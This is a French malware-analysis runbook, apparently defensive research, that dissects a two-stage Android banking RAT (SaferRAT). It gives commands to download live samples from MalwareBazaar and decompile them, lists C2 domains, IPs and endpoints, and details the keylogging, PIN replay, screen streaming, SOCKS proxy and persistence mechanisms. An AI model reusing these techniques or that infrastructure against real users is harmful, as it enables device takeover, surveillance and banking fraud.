# Runbook : reproduction pas à pas

## A. Vérification de la disponibilité avant de s'engager

**Commande :**
```bash
MB_KEY=$(cat ~/ctf-reverse/.mb_api_key)
for tag in Rokarolla Crocodilus RecruitRat SaferRat Astrinox Massiv; do
  curl -s -X POST https://mb-api.abuse.ch/api/v1/ -H "Auth-Key: $MB_KEY" -d "query=get_taginfo&tag=$tag&limit=3"
done
```

**Pourquoi :** leçon tirée des analyses jscrambler/DeepSeek, vérifier la disponibilité réelle avant de s'engager dans une analyse.

**Retour :** Crocodilus, RecruitRat, SaferRat disponibles avec samples réels. Rokarolla/Astrinox/Massiv absents (trop récents ou non partagés).

## B. Installation de l'outillage Android

**Commande :**
```bash
pip install androguard
```

**Pourquoi :** `jadx`/`apktool` nécessitent Java (non installé) ; `androguard` est pur Python, avec parsing de manifest, décompilation DEX intégrée. Installation complète (pas `--no-deps`) après avoir appris de la galère Qiling, androguard a des dépendances bien plus légères (pas de pillow).

**Retour :** installation propre, `androguard --help` fonctionnel avec les commandes `axml`, `decompile`, `disassemble`, `apkid`, `arsc`, `sign`, `cg`.

## C. Téléchargement des échantillons

**Commande :**
```bash
MB_KEY=$(cat ~/ctf-reverse/.mb_api_key)
curl -s -X POST https://mb-api.abuse.ch/api/v1/ -H "Auth-Key: $MB_KEY" \
  -d "query=get_file&sha256_hash=c9f0f8875297bccfa81dcae3fdec8cc67f6872e0e58d295cf2dcf89985e7a22b" -o sample1.zip
curl -s -X POST https://mb-api.abuse.ch/api/v1/ -H "Auth-Key: $MB_KEY" \
  -d "query=get_file&sha256_hash=d8cd89e8f7eb14c50e25705fea6f34390ab18486f2d1cadd5e195b0e663672c4" -o sample2.zip
```

**Retour :** premier essai → `502 Server Error` temporaire sur un des deux, résolu au second essai après quelques secondes.

## D. Extraction (zip chiffré AES, mot de passe standard MalwareBazaar)

**Commande :**
```bash
unzip -P infected -o sample.zip   # échoue : "need PK compat. v5.1 (can do v4.6)"
7z x -p"infected" -o./apks/ sample.zip -y   # fonctionne
find apks -type f -exec chmod -x {} \;
```

**Pourquoi :** l'`unzip` système ne supporte pas le format ZIP AES v5.1 utilisé par MalwareBazaar, `7z` (déjà présent sur la machine) le gère.

**Retour :** 2 APK extraits, jamais rendus exécutables, confirmés `Android package (APK)` via `file`.

## E. Analyse du manifest : payload réel

**Commande :**
```bash
androguard axml c9f0f8875297bccfa81dcae3fdec8cc67f6872e0e58d295cf2dcf89985e7a22b.apk
```

**Retour :** manifest complet, package `s3zse.f01pdoi.ohnrb2`, permissions SMS/caméra/micro/localisation/device admin, composants `VncAccessibilityService`, `CameraStreamService`, `MicrophoneStreamService`, `InjectWebActivity`, `SMSReceiver`, `MmsReceiver`, `MyDeviceAdminReceiver`, 4 mécanismes de persistance, voir writeup.md §4.

## F. Analyse du manifest : dropper

**Commande :**
```bash
androguard axml d8cd89e8f7eb14c50e25705fea6f34390ab18486f2d1cadd5e195b0e663672c4.apk
```

**Retour :** package `com.example.nestedinstaller`, `REQUEST_INSTALL_PACKAGES`+`QUERY_ALL_PACKAGES`, classe `NestedInstallerApp`.

## G. Confirmation de la structure à deux étages (hash exact)

**Commande :**
```bash
unzip -l Strawberry.apk | grep assets
# → assets/nested_app.apk, 8558466 octets (taille identique au 2e sample)
unzip -o Strawberry.apk assets/nested_app.apk -d /tmp/extracted_asset
sha256sum /tmp/extracted_asset/assets/nested_app.apk
```

**Retour :** `c9f0f8875297bccfa81dcae3fdec8cc67f6872e0e58d295cf2dcf89985e7a22b`, hash identique au payload téléchargé séparément.

**Ce qu'on en retient :** confirme, par le hash et non par supposition, que le dropper embarque exactement le payload comme ressource. Voir writeup.md §3.

---

# Décompilation complète, C2, attribution

## H. Décompilation complète du payload

**Commande :**
```bash
androguard decompile -o decompiled_payload c9f0f8875297bccfa81dcae3fdec8cc67f6872e0e58d295cf2dcf89985e7a22b.apk
```

**Retour :** exécution en arrière-plan (~2 min), centaines de classes Java produites, aucune erreur bloquante (quelques warnings "Multiple exit nodes found" sur des méthodes isolées, sans impact). Structure `com.example.safeservice.*` complète.

## I. Extraction directe de la config C2

**Commande :**
```bash
unzip -p nested_app.apk res/raw/servers.json
```

**Retour :** `{"servers": ["https://gorila-panel.xyz"]}`, trouvé après lecture de `ServerConfig.java` qui pointait vers cette ressource plutôt qu'une chaîne en dur dans le bytecode.

## J. Vérification passive du C2

**Commande :**
```bash
dig +short gorila-panel.xyz A
whois gorila-panel.xyz
curl -s "https://internetdb.shodan.io/91.184.247.166"
curl -s -X POST "https://threatfox-api.abuse.ch/api/v1/" -H "Auth-Key: $(cat ~/ctf-reverse/.mb_api_key)" -d '{"query":"search_ioc","search_term":"gorila-panel.xyz"}'
```

**Retour :** IP `91.184.247.166`, nameservers `NS1-4.VDSINA.RU` (hébergeur russe), aucune entrée Shodan, aucune entrée ThreatFox (ni pour le domaine ni pour l'IP), IOC neuf.

## K. Lecture de `DeveloperActivity.java`

**Commande :** `Read` direct du fichier décompilé.

**Retour :** assistant de configuration complet avec contournements OEM (Xiaomi/Huawei/Samsung/OPPO/Vivo), tous les textes UI en russe, voir writeup.md §5.2.

## L. Lecture de `InjectConfigManager.java`

**Retour :** confirme que la table cible (package bancaire → URL phishing) est peuplée uniquement via `updateFromJson()` depuis le C2, rien de statique dans l'APK.

## M. Lecture de `BotRegister.java` : découverte du tag "Diabloo"

**Retour :** protocole d'enregistrement `POST /api/register_bot.php` avec charge JSON `{tag, phone, worker: "Diabloo", sim_info}`. `WebSearch` sur "Diabloo" + malware/botnet/telegram → aucun résultat public, tag non documenté ailleurs.

---

# Certificats, recherche multi-samples, protocole complet

## N. Comparaison des certificats de signature

**Commande :**
```bash
androguard sign d8cd89e8f7eb14c50e25705fea6f34390ab18486f2d1cadd5e195b0e663672c4.apk
androguard sign c9f0f8875297bccfa81dcae3fdec8cc67f6872e0e58d295cf2dcf89985e7a22b.apk
```

**Retour :** certificats différents (SHA1 `ccca3ab1...` vs `44bd3913...`), tous deux v2-signés uniquement.

**Détail complet (androguard API Python, `get_certificates_v2()`) :**
```python
from androguard.core.apk import APK
a = APK(fichier)
for cert in a.get_certificates_v2():
    print(cert.subject.human_friendly, cert.not_valid_before, cert.sha256_fingerprint)
```

**Retour :** les deux certificats ont `CN=Android Debug, O=Android, C=US` (keystore de debug générique Android/Gradle), donc pas de certificat personnalisé attribuable. Dates de validité différentes : dropper depuis 22/06/2026, payload depuis 24/03/2025 (~15 mois d'écart).

**Ce qu'on en retient :** pas de lien direct via le certificat (debug key générique), mais l'ancienneté du keystore du payload suggère une réutilisation d'environnement de build sur la durée. Voir writeup.md §6 point 2.

## O. Recherche d'autres samples SaferRAT

**Commande :**
```bash
curl -s -X POST https://mb-api.abuse.ch/api/v1/ -H "Auth-Key: $MB_KEY" -d "query=get_taginfo&tag=SaferRAT&limit=50"
```

**Retour :** seulement les 2 samples déjà en main. Aucun autre disponible pour tester l'hypothèse multi-opérateurs (tags "worker" différents).

## P. Lecture du protocole complet de contrôle à distance

**Commande :** `Read` sur `net/VncWebSocketClient.java`, méthode `handleCommand` (dispatcher de commandes basé sur un `switch` sur le hash de la chaîne `action`).

**Retour :** liste complète des commandes C2, voir writeup.md §5.5. Confirmation exacte des commandes `enable_anti_delete`/`disable_anti_delete` du rapport Zimperium, plus découverte de `autopin` (rejeu automatique de PIN + séquence tactile), `uidump`, `show_overlay_black`, contrôle audio/vidéo complet.

---

# Modules supplémentaires, lecture intégrale de VncAccessibilityService et ProxyWebSocketService, deux nouveaux C2

## Q. Lecture de `UssdSender.java`

**Retour :** envoi de codes USSD arbitraires via une intention `CALL` sur `tel:*...#`, code réel fourni par le C2. Voir writeup.md §5.6.

## R. Lecture de `NotificationListener.java`

**Retour :** exfiltre titre/texte de chaque notification (`POST /api/log_notification.php`), reçoit une liste de packages à bloquer depuis le C2 (`GET /api/not_block_list.php?bot_tag=...`), et supprime silencieusement (`cancelNotification()`) les notifications des apps bloquées tout en les exfiltrant quand même. Voir writeup.md §5.6.

## S. Lecture de `KeyLoggerService.java`, puis vérification manifest

**Commande :**
```bash
androguard axml nested_app.apk | grep -B2 -A3 "KeyLogger\|AccessibilityService"
```

**Retour :** `KeyLoggerService` (vrai keylogger + moniteur presse-papier fonctionnel, `POST /api/log_keystrokes.php`) n'apparaît **pas** dans le manifest, seul `VncAccessibilityService` a l'intent-filter d'accessibilité requis pour être activé par Android.

**Ce qu'on en retient :** code réel et fonctionnel mais inactif sur ce build précis, cohérent avec un framework modulaire où des fonctionnalités sont activées/désactivées par client sans retirer le code. Voir writeup.md §5.6.

## T. Lecture complète de `VncAccessibilityService.java` et `VncAccessibilityService$Companion.java`

**Commande :** `Read` direct des deux fichiers décompilés (1039 + 1647 lignes).

**Retour :** correction majeure par rapport à la lecture précédente (§5.6 dans sa version antérieure) : le service réellement actif (`VncAccessibilityService`, pas `KeyLoggerService`) contient son propre keylogger (`TYPE_VIEW_TEXT_CHANGED`), son propre moniteur de presse-papier (câblé dans `onServiceConnected`), et un pipeline complet de capture de PIN par coordonnées (`trackPinClickWithCoords`, `sendVerifiedPin`), avec deux nouveaux types de message WebSocket bot vers C2 : `pin_click` et `pin_verified`. Confirmé aussi : `autoInputPin` rejoue les taps avec un délai de 400 ms entre chaque via `Handler.postDelayed`, `dumpUiHierarchy` fait une vraie traversée récursive de l'arbre d'accessibilité envoyée en `uidump`, `showOverlayWeb` instancie une vraie `WebView` avec JS activé chargeant l'URL du C2, et `performTap`/`performInitialLongPress`/`processRealtimePoints` utilisent tous `dispatchGesture`/`GestureDescription`, la vraie API Android d'injection tactile pour service d'accessibilité. Voir writeup.md §5.6 (corrigé), §5.7, §5.8.

**Découverte incidente** : `onServiceConnected()` construit `VncWebSocketClient(this, "ws://94.103.89.12:8765")`, une URL codée en dur, différente du panel HTTP `gorila-panel.xyz`. Un deuxième canal C2, pour le contrôle temps réel.

## U. Vérification passive du deuxième C2 (`94.103.89.12`)

**Commande :**
```bash
whois 94.103.89.12
curl -s "https://internetdb.shodan.io/94.103.89.12"
curl -s -X POST "https://threatfox-api.abuse.ch/api/v1/" -H "Auth-Key: $(cat ~/ctf-reverse/.mb_api_key)" -d '{"query":"search_ioc","search_term":"94.103.89.12"}'
```

**Retour :** hébergé chez VDSINA (même hébergeur que le panel HTTP, `abuse@vdsina.ru`), aucune entrée Shodan, aucune entrée ThreatFox, IOC neuf.

## V. Lecture complète de `ProxyWebSocketService.java`

**Retour :** troisième canal C2, un proxy SOCKS inversé complet. `handleTextMessage` reçoit `connId:host:port` et ouvre une vraie `java.net.Socket` TCP vers cette destination, `handleBinaryMessage` relaie les données binaires dans les deux sens sur le WebSocket, multiplexées par `connId`. URL codée en dur : `ws://89.185.80.124:55332/socks/<bot_id>`. Notification de premier plan déguisée en "Antivirus" / "System heart". Voir writeup.md §5.9.

## W. Vérification passive du troisième C2 (`89.185.80.124`)

**Commande :** mêmes vérifications passives qu'en U.

**Retour :** hébergeur distinct des deux autres, Global Connectivity Solutions (Royaume-Uni/Danemark, `abuse@globconnex.com`), aucune entrée Shodan ni ThreatFox, deuxième IOC neuf trouvé ici.

**Ce qu'on en retient :** ce malware ne parle pas à un C2 unique mais à trois canaux séparés sur deux hébergeurs différents, une segmentation d'infrastructure qui limite l'impact si un seul canal ou un seul hébergeur est démantelé. Voir writeup.md §5.9 pour la table complète et l'explication du mécanisme de proxy résidentiel.

## X. Lecture complète de `KeyLoggerService.java`, comparaison ligne à ligne avec `VncAccessibilityService`

**Commande :** `Read` direct du fichier décompilé (39 lignes utiles), comparaison manuelle avec les méthodes équivalentes de `VncAccessibilityService`.

**Retour :** la ligne de log du moniteur de presse-papier ("📋 Скопировано в буфер: ", emoji compris) est identique caractère pour caractère dans les deux classes, un copier-coller direct. `KeyLoggerService` est une version nettement plus simple : envoi HTTP immédiat sans bufferisation, aucune gestion de `TYPE_VIEW_CLICKED`, donc aucune capture de PIN par coordonnées, aucun canal WebSocket, aucune configuration de service d'accessibilité complète (pas de `setServiceInfo`, pas de foreground service).

**Ce qu'on en retient :** `KeyLoggerService` est le prototype à partir duquel le keylogger et le moniteur de presse-papier ont été copiés puis étendus dans `VncAccessibilityService`, laissé en place non déclaré dans le manifest après la consolidation des fonctionnalités en un seul service d'accessibilité. Voir writeup.md §5.6.

## Y. Installation et exécution de `quark-engine`

**Commande :**
```bash
source tools/venv/bin/activate
pip install quark-engine
freshquark
quark -a c9f0f8875297bccfa81dcae3fdec8cc67f6872e0e58d295cf2dcf89985e7a22b.apk -s -t 60
```

**Pourquoi :** triage de capacités structuré et automatisé, en complément (pas en remplacement) de la lecture manuelle de code déjà faite.

**Retour :** classification "High Risk", score cumulé 0.97 au seuil 60%, plus de 130 comportements reconnus. Les signatures les mieux pondérées (réflexion dynamique, POST HTTP, lecture presse-papier, dispatch de gestes, overlay, accès à l'arbre d'accessibilité) recoupent exactement les capacités déjà confirmées manuellement, aucun élément nouveau. Voir writeup.md §5.10.

## Z. Lecture complète des six derniers modules non lus

**Commande :** `Read` direct de `BotHeartbeatService.java`, `GuardService.java`, `ScreenCastService.java`, `PhotosExporter.java`, `ContactsFetcher.java`, `CallLogSender.java`, `SilentAudioPlayer.java`.

**Retour :** `BotHeartbeatService` est le chef d'orchestre : un canal de commandes par polling HTTP (`GET /api/get_bot_commands.php`, 10s) avec son propre jeu de commandes (`export_sms`, `send_sms`, `export_call_log`, `show_notification`, `send_ussd`, `add_contact`), démarre `SilentAudioPlayer` (piste audio silencieuse en boucle pour survie du processus) et `GuardService`, avec lequel il forme un watchdog mutuel (chacun relance l'autre, `checkMainProcess()` toutes les 30s côté `GuardService`, vérification toutes les 60s côté `BotHeartbeatService`). `ScreenCastService` confirme un vrai streaming d'écran (`MediaProjection`+`ImageReader`, JPEG qualité 60, Base64, envoyé sur le WebSocket `ws://94.103.89.12:8765`). `PhotosExporter` exfiltre en masse toute la pellicule photo/vidéo vers un service HTTP séparé, `http://94.103.89.12:9000/upload_photo`, déclenché automatiquement dès l'octroi des permissions médias dans `MainActivity`, pas sur commande C2. `ContactsFetcher` est confirmé actif (`ENABLE_CONTACTS_FETCH = true` codé en dur dans `MainActivity`). `CallLogSender` envoie chaque appel entrant individuellement en temps réel, distinct de l'export en masse `BotCallLogExporter` déclenché par la commande `export_call_log`.

**Découverte incidente** : `BotHeartbeatService.onCreate()` logue explicitement que `ProxyWebSocketService` n'est pas démarré sur ce build ("режим прокси отключён"). Recherche exhaustive (`grep -r "ProxyWebSocketService)"`) confirme qu'aucun autre point du code ne l'instancie ou ne le démarre : le canal proxy SOCKS (§5.9) est du code réel et fonctionnel mais dormant sur cet échantillon, même situation que `KeyLoggerService`.

**Ce qu'on en retient :** cinquième mécanisme de persistance confirmé (watchdog mutuel), quatrième service réseau confirmé (upload photo/vidéo sur un port séparé de la même IP VDSINA), et une correction méthodologique importante sur le statut réel du canal proxy. Voir writeup.md §4, §5.9, §5.11, §6 point 4.

---

Suite : voir writeup.md §6 (plan de reprise).
